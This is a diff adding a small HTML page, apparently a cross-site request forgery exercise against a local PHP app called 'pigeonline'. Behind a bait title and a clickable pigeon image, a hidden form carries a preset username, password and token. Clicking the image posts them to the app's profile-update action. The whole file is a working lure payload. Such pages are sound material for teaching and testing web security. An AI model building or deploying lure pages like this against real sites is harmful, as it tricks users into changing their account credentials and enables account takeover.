@@ -1,0 +1,23 @@
+<html>
+
+<head>
+    <title>Watch this cool image!</title>
+</head>
+
+<body>
+    <form method="POST" id="form-id" action="http://127.0.0.1:8080/esercizi/pigeonline/index.php?action=aggiornaProfilo">
+        <input name="username" value="dvdxl" hidden>
+        <input name="password" value="lamiapassword" hidden>
+        <input name="token" id="token" value="sfsdwrvrvervwvrverved" hidden>
+        <img id="img" src="./utils/imgs/piccioneScemo.png">
+    </form>
+
+    <script>
+        var form = document.getElementById("form-id");
+        document.getElementById("img").addEventListener("click", function () {
+            form.submit();
+        });
+    </script>
+</body>
+
+</html>
